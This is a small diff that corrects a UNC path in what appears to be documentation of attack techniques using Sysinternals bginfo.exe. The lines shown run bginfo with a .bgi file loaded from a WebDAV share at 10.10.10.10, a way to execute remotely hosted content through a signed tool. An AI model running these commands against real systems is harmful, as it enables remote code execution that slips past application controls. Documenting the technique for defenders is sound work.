@@ -7,7 +7,7 @@ bginfo.exe bginfo.bgi /popup /nolicprompt
 
 "\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt    
 
-"\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt   
+"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt   
 ```
 
 Acknowledgements:
